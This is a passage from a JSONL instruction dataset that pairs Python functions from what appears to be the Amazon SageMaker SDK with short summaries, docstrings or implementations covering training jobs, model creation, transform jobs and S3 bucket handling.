(list[dict]): List of tags for labeling a transform job. If none specified, then the tags used for\n                the training job are used for the transform job.\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n                transform jobs. If not specified, the role from the Estimator will be used.\n            volume_kms_key (str): Optional. KMS key ID for encrypting the volume attached to the ML\n                compute instance (default: None).\n        \"\"\"\n        if self.latest_training_job is not None:\n            model_name = self.sagemaker_session.create_model_from_job(self.latest_training_job.name, role=role)\n        else:\n            logging.warning('No finished training job found associated with this estimator. Please make sure'\n                            'this estimator is only used for building workflow config')\n            model_name = self._current_job_name\n\n        tags = tags or self.tags\n\n        return Transformer(model_name, instance_count, instance_type, strategy=strategy, assemble_with=assemble_with,\n                           output_path=output_path, output_kms_key=output_kms_key, accept=accept,\n                           max_concurrent_transforms=max_concurrent_transforms, max_payload=max_payload,\n                           env=env, tags=tags, base_transform_job_name=self.base_job_name,\n                           volume_kms_key=volume_kms_key, sagemaker_session=self.sagemaker_session)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef training_job_analytics(self):\n        if self._current_job_name is None:\n            raise ValueError('Estimator is not associated with a TrainingJob')\n        return TrainingJobAnalytics(self._current_job_name, sagemaker_session=self.sagemaker_session)", "response": "Return a TrainingJobAnalytics object for the current training job."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a dict of VpcConfig values from this Estimator s subnets security groups and vpc_config_override.", "response": "def get_vpc_config(self, vpc_config_override=vpc_utils.VPC_CONFIG_DEFAULT):\n        \"\"\"\n        Returns VpcConfig dict either from this Estimator's subnets and security groups,\n        or else validate and return an optional override value.\n        \"\"\"\n        if vpc_config_override is vpc_utils.VPC_CONFIG_DEFAULT:\n            return vpc_utils.to_dict(self.subnets, self.security_group_ids)\n        else:\n            return vpc_utils.sanitize(vpc_config_override)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef start_new(cls, estimator, inputs):\n\n        local_mode = estimator.sagemaker_session.local_mode\n        model_uri = estimator.model_uri\n\n        # Allow file:// input only in local mode\n        if cls._is_local_channel(inputs) or cls._is_local_channel(model_uri):\n            if not local_mode:\n                raise ValueError('File URIs are supported in local mode only. Please use a S3 URI instead.')\n\n        config = _Job._load_config(inputs, estimator)\n\n        if estimator.hyperparameters() is not None:\n            hyperparameters = {str(k): str(v) for (k, v) in estimator.hyperparameters().items()}\n\n        train_args = config.copy()\n        train_args['input_mode'] = estimator.input_mode\n        train_args['job_name'] = estimator._current_job_name\n        train_args['hyperparameters'] = hyperparameters\n        train_args['tags'] = estimator.tags\n        train_args['metric_definitions'] = estimator.metric_definitions\n\n        if estimator.enable_network_isolation():\n            train_args['enable_network_isolation'] = True\n\n        if estimator.encrypt_inter_container_traffic:\n            train_args['encrypt_inter_container_traffic'] = True\n\n        if isinstance(estimator, sagemaker.algorithm.AlgorithmEstimator):\n            train_args['algorithm_arn'] = estimator.algorithm_arn\n        else:\n            train_args['image'] = estimator.train_image()\n\n        estimator.sagemaker_session.train(**train_args)\n\n        return cls(estimator.sagemaker_session, estimator._current_job_name)", "response": "Create a new Amazon SageMaker training job from an estimator."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new model for the given parameters.", "response": "def create_model(self, role=None, image=None, predictor_cls=None, serializer=None, deserializer=None,\n                     content_type=None, accept=None, vpc_config_override=vpc_utils.VPC_CONFIG_DEFAULT, **kwargs):\n        \"\"\"\n        Create a model to deploy.\n\n        Args:\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n                transform jobs. If not specified, the role from the Estimator will be used.\n            image (str): An container image to use for deploying the model. Defaults to the image used for training.\n            predictor_cls (RealTimePredictor): The predictor class to use when deploying the model.\n            serializer (callable): Should accept a single argument, the input data, and return a sequence\n                of bytes. May provide a content_type attribute that defines the endpoint request content type\n            deserializer (callable): Should accept two arguments, the result data and the response content type,\n                and return a sequence of bytes. May provide a content_type attribute that defines th endpoint\n                response Accept content type.\n            content_type (str): The invocation ContentType, overriding any content_type from the serializer\n            accept (str): The invocation Accept, overriding any accept from the deserializer.\n            vpc_config_override (dict[str, list[str]]): Optional override for VpcConfig set on the model.\n                Default: use subnets and security groups from this Estimator.\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n\n            The serializer, deserializer, content_type, and accept arguments are only used to define a default\n            RealTimePredictor. They are ignored if an explicit predictor class is passed in. Other arguments\n            are passed through to the Model class.\n\n        Returns: a Model ready for deployment.\n        \"\"\"\n        if predictor_cls is None:\n            def predict_wrapper(endpoint, session):\n                return RealTimePredictor(endpoint, session, serializer, deserializer, content_type, accept)\n            predictor_cls = predict_wrapper\n\n        role = role or self.role\n\n        return Model(self.model_data, image or self.train_image(), role,\n                     vpc_config=self.get_vpc_config(vpc_config_override),\n                     sagemaker_session=self.sagemaker_session, predictor_cls=predictor_cls, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting the job description to init params that can be handled by the class constructor.", "response": "def _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        \"\"\"Convert the job description to init params that can be handled by the class constructor\n\n        Args:\n            job_details: the returned job details from a describe_training_job API call.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded\n\n        Returns:\n             dictionary: The transformed init_params\n\n        \"\"\"\n        init_params = super(Estimator, cls)._prepare_init_params_from_job_description(job_details, model_channel_name)\n\n        init_params['image_name'] = init_params.pop('image')\n        return init_params"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _prepare_for_training(self, job_name=None):\n        super(Framework, self)._prepare_for_training(job_name=job_name)\n\n        # validate source dir will raise a ValueError if there is something wrong with the\n        # source directory. We are intentionally not handling it because this is a critical error.\n        if self.source_dir and not self.source_dir.lower().startswith('s3://'):\n            validate_source_dir(self.entry_point, self.source_dir)\n\n        # if we are in local mode with local_code=True. We want the container to just\n        # mount the source dir instead of uploading to S3.\n        local_code = get_config_value('local.local_code', self.sagemaker_session.config)\n        if self.sagemaker_session.local_mode and local_code:\n            # if there is no source dir, use the directory containing the entry point.\n            if self.source_dir is None:\n                self.source_dir = os.path.dirname(self.entry_point)\n            self.entry_point = os.path.basename(self.entry_point)\n\n            code_dir = 'file://' + self.source_dir\n            script = self.entry_point\n        else:\n            self.uploaded_code = self._stage_user_code_in_s3()\n            code_dir = self.uploaded_code.s3_prefix\n            script = self.uploaded_code.script_name\n\n        # Modify hyperparameters in-place to point to the right code directory and script URIs\n        self._hyperparameters[DIR_PARAM_NAME] = code_dir\n        self._hyperparameters[SCRIPT_PARAM_NAME] = script\n        self._hyperparameters[CLOUDWATCH_METRICS_PARAM_NAME] = self.enable_cloudwatch_metrics\n        self._hyperparameters[CONTAINER_LOG_LEVEL_PARAM_NAME] = self.container_log_level\n        self._hyperparameters[JOB_NAME_PARAM_NAME] = self._current_job_name\n        self._hyperparameters[SAGEMAKER_REGION_PARAM_NAME] = self.sagemaker_session.boto_region_name", "response": "Set hyperparameters needed for training. This method will also validate source_dir and source_dir."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _stage_user_code_in_s3(self):\n        local_mode = self.output_path.startswith('file://')\n\n        if self.code_location is None and local_mode:\n            code_bucket = self.sagemaker_session.default_bucket()\n            code_s3_prefix = '{}/source'.format(self._current_job_name)\n            kms_key = None\n\n        elif self.code_location is None:\n            code_bucket, _ = parse_s3_url(self.output_path)\n            code_s3_prefix = '{}/source'.format(self._current_job_name)\n            kms_key = self.output_kms_key\n        else:\n            code_bucket, key_prefix = parse_s3_url(self.code_location)\n            code_s3_prefix = '/'.join(filter(None, [key_prefix, self._current_job_name, 'source']))\n\n            output_bucket, _ = parse_s3_url(self.output_path)\n            kms_key = self.output_kms_key if code_bucket == output_bucket else None\n\n        return tar_and_upload_dir(session=self.sagemaker_session.boto_session,\n                                  bucket=code_bucket,\n                                  s3_key_prefix=code_s3_prefix,\n                                  script=self.entry_point,\n                                  directory=self.source_dir,\n                                  dependencies=self.dependencies,\n                                  kms_key=kms_key)", "response": "Upload the user training script to s3 and return the location."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets the appropriate value to pass as source_dir to model constructor on deploying", "response": "def _model_source_dir(self):\n        \"\"\"Get the appropriate value to pass as source_dir to model constructor on deploying\n\n        Returns:\n            str: Either a local or an S3 path pointing to the source_dir to be used for code by the model to be deployed\n        \"\"\"\n        return self.source_dir if self.sagemaker_session.local_mode else self.uploaded_code.s3_prefix"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert the job description to init params that can be handled by the class constructor.", "response": "def _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        \"\"\"Convert the job description to init params that can be handled by the class constructor\n\n        Args:\n            job_details: the returned job details from a describe_training_job API call.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded\n\n        Returns:\n             dictionary: The transformed init_params\n\n        \"\"\"\n        init_params = super(Framework, cls)._prepare_init_params_from_job_description(job_details, model_channel_name)\n\n        init_params['entry_point'] = json.loads(init_params['hyperparameters'].get(SCRIPT_PARAM_NAME))\n        init_params['source_dir'] = json.loads(init_params['hyperparameters'].get(DIR_PARAM_NAME))\n        init_params['enable_cloudwatch_metrics'] = json.loads(\n            init_params['hyperparameters'].get(CLOUDWATCH_METRICS_PARAM_NAME))\n        init_params['container_log_level'] = json.loads(\n            init_params['hyperparameters'].get(CONTAINER_LOG_LEVEL_PARAM_NAME))\n\n        hyperparameters = {}\n        for k, v in init_params['hyperparameters'].items():\n            # Tuning jobs add this special hyperparameter which is not JSON serialized\n            if k == '_tuning_objective_metric':\n                if v.startswith('\"') and v.endswith('\"'):\n                    v = v.strip('\"')\n                hyperparameters[k] = v\n            else:\n                hyperparameters[k] = json.loads(v)\n\n        init_params['hyperparameters'] = hyperparameters\n\n        return init_params"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the URI of the Docker image to use for training.", "response": "def train_image(self):\n        \"\"\"Return the Docker image to use for training.\n\n        The  :meth:`~sagemaker.estimator.EstimatorBase.fit` method, which does the model training,\n        calls this method to find the image to use for model training.\n\n        Returns:\n            str: The URI of the Docker image.\n        \"\"\"\n        if self.image_name:\n            return self.image_name\n        else:\n            return create_image_uri(self.sagemaker_session.boto_region_name,\n                                    self.__framework_name__,\n                                    self.train_instance_type,\n                                    self.framework_version,  # pylint: disable=no-member\n                                    py_version=self.py_version)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nattach to an existing training job.", "response": "def attach(cls, training_job_name, sagemaker_session=None, model_channel_name='model'):\n        \"\"\"Attach to an existing training job.\n\n        Create an Estimator bound to an existing training job, each subclass is responsible to implement\n        ``_prepare_init_params_from_job_description()`` as this method delegates the actual conversion of a training\n        job description to the arguments that the class constructor expects. After attaching, if the training job has a\n        Complete status, it can be ``deploy()`` ed to create a SageMaker Endpoint and return a ``Predictor``.\n\n        If the training job is in progress, attach will block and display log messages\n        from the training job, until the training job completes.\n\n        Args:\n            training_job_name (str): The name of the training job to attach to.\n            sagemaker_session (sagemaker.session.Session): Session object which manages interactions with\n                Amazon SageMaker APIs and any other AWS services needed. If not specified, the estimator creates one\n                using the default AWS configuration chain.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded (default:\n                'model'). If no channel with the same name exists in the training job, this option will be ignored.\n\n        Examples:\n            >>> my_estimator.fit(wait=False)\n            >>> training_job_name = my_estimator.latest_training_job.name\n            Later on:\n            >>> attached_estimator = Estimator.attach(training_job_name)\n            >>> attached_estimator.deploy()\n\n        Returns:\n            Instance of the calling ``Estimator`` Class with the attached training job.\n        \"\"\"\n        estimator = super(Framework, cls).attach(training_job_name, sagemaker_session, model_channel_name)\n\n        # pylint gets confused thinking that estimator is an EstimatorBase instance, but it actually\n        # is a Framework or any of its derived classes. We can safely ignore the no-member errors.\n        estimator.uploaded_code = UploadedCode(\n            estimator.source_dir, estimator.entry_point)  # pylint: disable=no-member\n        return estimator"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef transformer(self, instance_count, instance_type, strategy=None, assemble_with=None, output_path=None,\n                    output_kms_key=None, accept=None, env=None, max_concurrent_transforms=None,\n                    max_payload=None, tags=None, role=None, model_server_workers=None, volume_kms_key=None):\n        \"\"\"Return a ``Transformer`` that uses a SageMaker Model based on the training job. It reuses the\n        SageMaker Session and base job name used by the Estimator.\n\n        Args:\n            instance_count (int): Number of EC2 instances to use.\n            instance_type (str): Type of EC2 instance to use, for example, 'ml.c4.xlarge'.\n            strategy (str): The strategy used to decide how to batch records in a single request (default: None).\n                Valid values: 'MULTI_RECORD' and 'SINGLE_RECORD'.\n            assemble_with (str): How the output is assembled (default: None). Valid values: 'Line' or 'None'.\n            output_path (str): S3 location for saving the transform result. If not specified, results are stored to\n                a default bucket.\n            output_kms_key (str): Optional. KMS key ID for encrypting the transform output (default: None).\n            accept (str): The content type accepted by the endpoint deployed during the transform job.\n            env (dict): Environment variables to be set for use during the transform job (default: None).\n            max_concurrent_transforms (int): The maximum number of HTTP requests to be made to\n                each individual transform container at one time.\n            max_payload (int): Maximum size of the payload in a single HTTP request to the container in MB.\n            tags (list[dict]): List of tags for labeling a transform job. If none specified, then the tags used for\n                the training job are used for the transform job.\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n                transform jobs. If not specified, the role from the Estimator will be used.\n            model_server_workers (int): Optional. The number of worker processes used by the inference server.\n                If None, server will use one worker per vCPU.\n            volume_kms_key (str): Optional. KMS key ID for encrypting the volume attached to the ML\n                compute instance (default: None).\n        \"\"\"\n        role = role or self.role\n\n        if self.latest_training_job is not None:\n            model = self.create_model(role=role, model_server_workers=model_server_workers)\n\n            container_def = model.prepare_container_def(instance_type)\n            model_name = model.name or name_from_image(container_def['Image'])\n            vpc_config = model.vpc_config\n            self.sagemaker_session.create_model(model_name, role, container_def, vpc_config)\n            transform_env = model.env.copy()\n            if env is not None:\n                transform_env.update(env)\n        else:\n            logging.warning('No finished training job found associated with this estimator. Please make sure'\n                            'this estimator is only used for building workflow config')\n            model_name = self._current_job_name\n            transform_env = env or {}\n\n        tags = tags or self.tags\n        return Transformer(model_name, instance_count, instance_type, strategy=strategy, assemble_with=assemble_with,\n                           output_path=output_path, output_kms_key=output_kms_key, accept=accept,\n                           max_concurrent_transforms=max_concurrent_transforms, max_payload=max_payload,\n                           env=transform_env, tags=tags, base_transform_job_name=self.base_job_name,\n                           volume_kms_key=volume_kms_key, sagemaker_session=self.sagemaker_session)", "response": "Returns a Transformer that uses a SageMaker Model based on the training job."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn all non - None hyperparameter values on obj as a dict [ str ]", "response": "def serialize_all(obj):\n        \"\"\"Return all non-None ``hyperparameter`` values on ``obj`` as a ``dict[str,str].``\"\"\"\n        if '_hyperparameters' not in dir(obj):\n            return {}\n        return {k: str(v) for k, v in obj._hyperparameters.items() if v is not None}"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef start(self, input_data, output_data, transform_resources, **kwargs):\n        self.transform_resources = transform_resources\n        self.input_data = input_data\n        self.output_data = output_data\n\n        image = self.primary_container['Image']\n        instance_type = transform_resources['InstanceType']\n        instance_count = 1\n\n        environment = self._get_container_environment(**kwargs)\n\n        # Start the container, pass the environment and wait for it to start up\n        self.container = _SageMakerContainer(instance_type, instance_count, image, self.local_session)\n        self.container.serve(self.primary_container['ModelDataUrl'], environment)\n\n        serving_port = get_config_value('local.serving_port', self.local_session.config) or 8080\n        _wait_for_serving_container(serving_port)\n\n        # Get capabilities from Container if needed\n        endpoint_url = 'http://localhost:%s/execution-parameters' % serving_port\n        response, code = _perform_request(endpoint_url)\n        if code == 200:\n            execution_parameters = json.loads(response.read())\n            # MaxConcurrentTransforms is ignored because we currently only support 1\n            for setting in ('BatchStrategy', 'MaxPayloadInMB'):\n                if setting not in kwargs and setting in execution_parameters:\n                    kwargs[setting] = execution_parameters[setting]\n\n        # Apply Defaults if none was provided\n        kwargs.update(self._get_required_defaults(**kwargs))\n\n        self.start_time = datetime.datetime.now()\n        self.batch_strategy = kwargs['BatchStrategy']\n        if 'Environment' in kwargs:\n            self.environment = kwargs['Environment']\n\n        # run the batch inference requests\n        self._perform_batch_inference(input_data, output_data, **kwargs)\n        self.end_time = datetime.datetime.now()\n        self.state = self._COMPLETED", "response": "Start the Local Transform Job."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndescribing this _LocalTransformJob The response is a JSON-like dictionary that follows the response of the boto describe_transform_job() API. Returns: dict: description of this _LocalTransformJob", "response": "def describe(self):\n        \"\"\"Describe this _LocalTransformJob\n\n        The response is a JSON-like dictionary that follows the response of the\n        boto describe_transform_job() API.\n\n        Returns:\n            dict: description of this _LocalTransformJob\n        \"\"\"\n        response = {\n            'TransformJobStatus': self.state,\n            'ModelName': self.model_name,\n            'TransformJobName': self.name,\n            'TransformJobArn': _UNUSED_ARN,\n            'TransformEndTime': self.end_time,\n            'CreationTime': self.start_time,\n            'TransformStartTime': self.start_time,\n            'Environment': {},\n            'BatchStrategy': self.batch_strategy,\n        }\n\n        if self.transform_resources:\n            response['TransformResources'] = self.transform_resources\n\n        if self.output_data:\n            response['TransformOutput'] = self.output_data\n\n        if self.input_data:\n            response['TransformInput'] = self.input_data\n\n        return response"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_container_environment(self, **kwargs):\n        environment = {}\n        environment.update(self.primary_container['Environment'])\n        environment['SAGEMAKER_BATCH'] = 'True'\n        if 'MaxPayloadInMB' in kwargs:\n            environment['SAGEMAKER_MAX_PAYLOAD_IN_MB'] = str(kwargs['MaxPayloadInMB'])\n\n        if 'BatchStrategy' in kwargs:\n            if kwargs['BatchStrategy'] == 'SingleRecord':\n                strategy_env_value = 'SINGLE_RECORD'\n            elif kwargs['BatchStrategy'] == 'MultiRecord':\n                strategy_env_value = 'MULTI_RECORD'\n            else:\n                raise ValueError('Invalid BatchStrategy, must be \\'SingleRecord\\' or \\'MultiRecord\\'')\n            environment['SAGEMAKER_BATCH_STRATEGY'] = strategy_env_value\n\n        # we only do 1 max concurrent transform in Local Mode\n        if 'MaxConcurrentTransforms' in kwargs and int(kwargs['MaxConcurrentTransforms']) > 1:\n            logger.warning('Local Mode only supports 1 ConcurrentTransform. Setting MaxConcurrentTransforms to 1')\n        environment['SAGEMAKER_MAX_CONCURRENT_TRANSFORMS'] = '1'\n\n        # if there were environment variables passed to the Transformer we will pass them to the\n        # container as well.\n        if 'Environment' in kwargs:\n            environment.update(kwargs['Environment'])\n        return environment", "response": "Returns the environment variables that will be passed to the container."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef as_tuning_range(self, name):\n        return {'Name': name,\n                'MinValue': to_str(self.min_value),\n                'MaxValue': to_str(self.max_value),\n                'ScalingType': self.scaling_type}", "response": "Represent the parameter range as a dicionary suitable for a request to\n            create an Amazon SageMaker hyperparameter tuning job."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef as_json_range(self, name):\n        return {'Name': name, 'Values': [json.dumps(v) for v in self.values]}", "response": "Represent the parameter range as a dictionary suitable for a request to\n            create an Amazon SageMaker hyperparameter tuning job using one of the deep learning framework images require that hyperparameters be serialized as JSON."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef container_def(image, model_data_url=None, env=None):\n    if env is None:\n        env = {}\n    c_def = {'Image': image, 'Environment': env}\n    if model_data_url:\n        c_def['ModelDataUrl'] = model_data_url\n    return c_def", "response": "Create a definition for executing a container as part of a SageMaker model."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a list of container definitions for executing a SageMaker pipeline of containers.", "response": "def pipeline_container_def(models, instance_type=None):\n    \"\"\"\n    Create a definition for executing a pipeline of containers as part of a SageMaker model.\n    Args:\n        models (list[sagemaker.Model]): this will be a list of ``sagemaker.Model`` objects in the order the inference\n        should be invoked.\n        instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge' (default: None).\n    Returns:\n        list[dict[str, str]]: list of container definition objects usable with with the CreateModel API for inference\n        pipelines if passed via `Containers` field.\n    \"\"\"\n    c_defs = []  # should contain list of container definitions in the same order customer passed\n    for model in models:\n        c_defs.append(model.prepare_container_def(instance_type))\n    return c_defs"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a SageMaker production variant description suitable for use in a SageMaker EndpointConfig request.", "response": "def production_variant(model_name, instance_type, initial_instance_count=1, variant_name='AllTraffic',\n                       initial_weight=1, accelerator_type=None):\n    \"\"\"Create a production variant description suitable for use in a ``ProductionVariant`` list as part of a\n    ``CreateEndpointConfig`` request.\n\n    Args:\n        model_name (str): The name of the SageMaker model this production variant references.\n        instance_type (str): The EC2 instance type for this production variant. For example, 'ml.c4.8xlarge'.\n        initial_instance_count (int): The initial instance count for this production variant (default: 1).\n        variant_name (string): The ``VariantName`` of this production variant (default: 'AllTraffic').\n        initial_weight (int): The relative ``InitialVariantWeight`` of this production variant (default: 1).\n        accelerator_type (str): Type of Elastic Inference accelerator for this production variant. For example,\n            'ml.eia1.medium'. For more information: https://docs.aws.amazon.com/sagemaker/latest/dg/ei.html\n\n    Returns:\n        dict[str, str]: An SageMaker ``ProductionVariant`` description\n    \"\"\"\n    production_variant_configuration = {\n        'ModelName': model_name,\n        'InstanceType': instance_type,\n        'InitialInstanceCount': initial_instance_count,\n        'VariantName': variant_name,\n        'InitialVariantWeight': initial_weight\n    }\n\n    if accelerator_type:\n        production_variant_configuration['AcceleratorType'] = accelerator_type\n\n    return production_variant_configuration"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the ARN whose credentials are used to call the API.", "response": "def get_execution_role(sagemaker_session=None):\n    \"\"\"Return the role ARN whose credentials are used to call the API.\n    Throws an exception if\n    Args:\n        sagemaker_session(Session): Current sagemaker session\n    Returns:\n        (str): The role ARN\n    \"\"\"\n    if not sagemaker_session:\n        sagemaker_session = Session()\n    arn = sagemaker_session.get_caller_identity_arn()\n\n    if ':role/' in arn:\n        return arn\n    message = 'The current AWS identity is not a role: {}, therefore it cannot be used as a SageMaker execution role'\n    raise ValueError(message.format(arn))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _initialize(self, boto_session, sagemaker_client, sagemaker_runtime_client):\n        self.boto_session = boto_session or boto3.Session()\n\n        self._region_name = self.boto_session.region_name\n        if self._region_name is None:\n            raise ValueError('Must setup local AWS configuration with a region supported by SageMaker.')\n\n        self.sagemaker_client = sagemaker_client or self.boto_session.client('sagemaker')\n        prepend_user_agent(self.sagemaker_client)\n\n        if sagemaker_runtime_client is not None:\n            self.sagemaker_runtime_client = sagemaker_runtime_client\n        else:\n            config = botocore.config.Config(read_timeout=80)\n            self.sagemaker_runtime_client = self.boto_session.client('runtime.sagemaker', config=config)\n\n        prepend_user_agent(self.sagemaker_runtime_client)\n\n        self.local_mode = False", "response": "Initialize this SageMaker Session. Creates or uses a boto_session sagemaker_client and sagemaker_runtime_client Sets the region_name."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef upload_data(self, path, bucket=None, key_prefix='data'):\n        # Generate a tuple for each file that we want to upload of the form (local_path, s3_key).\n        files = []\n        key_suffix = None\n        if os.path.isdir(path):\n            for dirpath, _, filenames in os.walk(path):\n                for name in filenames:\n                    local_path = os.path.join(dirpath, name)\n                    s3_relative_prefix = '' if path == dirpath else os.path.relpath(dirpath, start=path) + '/'\n                    s3_key = '{}/{}{}'.format(key_prefix, s3_relative_prefix, name)\n                    files.append((local_path, s3_key))\n        else:\n            _, name = os.path.split(path)\n            s3_key = '{}/{}'.format(key_prefix, name)\n            files.append((path, s3_key))\n            key_suffix = name\n\n        bucket = bucket or self.default_bucket()\n        s3 = self.boto_session.resource('s3')\n\n        for local_path, s3_key in files:\n            s3.Object(bucket, s3_key).upload_file(local_path)\n\n        s3_uri = 's3://{}/{}'.format(bucket, key_prefix)\n        # If a specific file was used as input (instead of a directory), we return the full S3 key\n        # of the uploaded object. This prevents unintentionally using other files under the same prefix\n        # during training.\n        if key_suffix:\n            s3_uri = '{}/{}'.format(s3_uri, key_suffix)\n        return s3_uri", "response": "Uploads a file or directory to the S3 bucket."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the name of the default bucket to use in relevant Amazon SageMaker interactions.", "response": "def default_bucket(self):\n        \"\"\"Return the name of the default bucket to use in relevant Amazon SageMaker interactions.\n\n        Returns:\n            str: The name of the default bucket, which is of the form: ``sagemaker-{region}-{AWS account ID}``.\n        \"\"\"\n        if self._default_bucket:\n            return self._default_bucket\n\n        account = self.boto_session.client('sts').get_caller_identity()['Account']\n        region = self.boto_session.region_name\n        default_bucket = 'sagemaker-{}-{}'.format(region, account)\n\n        s3 = self.boto_session.resource('s3')\n        try:\n            # 'us-east-1' cannot be specified because it is the default region:\n            # https://github.com/boto/boto3/issues/125\n            if region == 'us-east-1':\n                s3.create_bucket(Bucket=default_bucket)\n            else:\n                s3.create_bucket(Bucket=default_bucket, CreateBucketConfiguration={'LocationConstraint': region})\n\n            LOGGER.info('Created S3 bucket: {}'.format(default_bucket))\n        except ClientError as e:\n            error_code = e.response['Error']['Code']\n            message = e.response['Error']['Message']\n\n            if error_code == 'BucketAlreadyOwnedByYou':\n                pass\n            elif error_code == 'OperationAborted' and 'conflicting conditional operation' in message:\n                # If this bucket is already being concurrently created, we don't need to create it again.\n                pass\n            elif error_code == 'TooManyBuckets':\n                # Succeed if the default bucket exists\n                s3.meta.client.head_bucket(Bucket=default_bucket)\n            else:\n                raise\n\n        self._default_bucket = default_bucket\n\n        return self._default_bucket"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating an Amazon SageMaker training job.", "response": "def train(self, input_mode, input_config, role, job_name, output_config,  # noqa: C901\n              resource_config, vpc_config, hyperparameters, stop_condition, tags, metric_definitions,\n              enable_network_isolation=False, image=None, algorithm_arn=None,\n              encrypt_inter_container_traffic=False):\n        \"\"\"Create an Amazon SageMaker training job.\n\n        Args:\n            input_mode (str): The input mode that the algorithm supports. Valid modes:\n\n                * 'File' - Amazon SageMaker copies the training dataset from the S3 location to\n                    a directory in the Docker container.\n                * 'Pipe' - Amazon SageMaker streams data directly from S3 to the container via a Unix-named pipe.\n\n            input_config (list): A list of Channel objects. Each channel is a named input source. Please refer to\n                 the format details described:\n                 https://botocore.readthedocs.io/en/latest/reference/services/sagemaker.html#SageMaker.Client.create_training_job\n            role (str): An AWS IAM role (either name or full ARN). The Amazon SageMaker training jobs and APIs\n                that create Amazon SageMaker endpoints use this role to access training data and model artifacts.\n                You must grant sufficient permissions to this role.\n            job_name (str): Name of the training job being created.\n            output_config (dict): The S3 URI where you want to store the training results and optional KMS key ID.\n            resource_config (dict): Contains values for ResourceConfig:\n\n                * instance_count (int): Number of EC2 instances to use for training.\n                    The key in resource_config is 'InstanceCount'.\n                * instance_type (str): Type of EC2 instance to use for training, for example, 'ml.c4.xlarge'.\n                    The key in resource_config is 'InstanceType'.\n\n            vpc_config (dict): Contains values for VpcConfig:\n\n                * subnets (list[str]): List of subnet ids.\n                    The key in vpc_config is 'Subnets'.\n                * security_group_ids (list[str]): List of security group ids.\n                    The key in vpc_config is 'SecurityGroupIds'.\n\n            hyperparameters (dict): Hyperparameters for model training. The hyperparameters are made accessible as\n                a dict[str, str] to the training code on SageMaker. For convenience, this accepts other types for\n                keys and values, but ``str()`` will be called to convert them before training.\n            stop_condition (dict): Defines when training shall finish. Contains entries that can be understood by the\n                service like ``MaxRuntimeInSeconds``.\n            tags (list[dict]): List of tags for labeling a training job. For more, see\n                https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html.\n            metric_definitions (list[dict]): A list of dictionaries that defines the metric(s) used to evaluate the\n                training jobs. Each dictionary contains two keys: 'Name' for the name of the metric, and 'Regex' for\n                the regular expression used to extract the metric from the logs.\n            enable_network_isolation (bool): Whether to request for the training job to run with\n                network isolation or not.\n            image (str): Docker image containing training code.\n            algorithm_arn (str): Algorithm Arn from Marketplace.\n            encrypt_inter_container_traffic (bool): Specifies whether traffic between training containers is\n                encrypted for the training job (default: ``False``).\n\n        Returns:\n            str: ARN of the training job, if it is created.\n        \"\"\"\n\n        train_request = {\n            'AlgorithmSpecification': {\n                'TrainingInputMode': input_mode\n            },\n            'OutputDataConfig': output_config,\n            'TrainingJobName': job_name,\n            'StoppingCondition': stop_condition,\n            'ResourceConfig': resource_config,\n            'RoleArn': role,\n        }\n\n        if image and algorithm_arn:\n            raise ValueError('image and algorithm_arn are mutually exclusive.'\n                             'Both were provided: image: %s algorithm_arn: %s' % (image, algorithm_arn))\n\n        if image is None and algorithm_arn is None:\n            raise ValueError('either image or algorithm_arn is required. None was provided.')\n\n        if image is not None:\n            train_request['AlgorithmSpecification']['TrainingImage'] = image\n\n        if algorithm_arn is not None:\n            train_request['AlgorithmSpecification']['AlgorithmName'] = algorithm_arn\n\n        if input_config is not None:\n            train_request['InputDataConfig'] = input_config\n\n        if metric_definitions is not None:\n            train_request['AlgorithmSpecification']['MetricDefinitions'] = metric_definitions\n\n        if hyperparameters and len(hyperparameters) > 0:\n            train_request['HyperParameters'] = hyperparameters\n\n        if tags is not None:\n            train_request['Tags'] = tags\n\n        if vpc_config is not None:\n            train_request['VpcConfig'] = 